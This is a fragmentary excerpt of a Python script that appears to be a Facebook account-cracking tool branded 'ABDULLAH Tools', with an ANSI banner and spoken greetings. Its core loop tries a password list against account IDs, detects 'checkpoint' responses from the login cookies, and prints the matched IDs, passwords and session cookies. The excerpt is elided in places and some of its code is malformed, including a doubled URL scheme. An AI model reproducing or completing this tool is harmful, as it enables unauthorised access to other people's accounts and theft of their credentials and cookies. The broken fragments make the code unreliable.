...
time.sleep(2)
os.system(f'xdg-open https://https://www.facebook.com/profile.php?id=100089255987022/')
#------------------[ ABDULLAH ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
def back():
    login()
def contact():
   # os.system('xdg-open https://https://www.facebook.com/profile.php?id=100089255987022')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mABDULLAH ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • ABDULLAH ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38ABDULLAH ]   ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  Abdullah,  Tools"')
pass
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[ABDULLAH-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " ABDULLAH,  Ok,  id"')
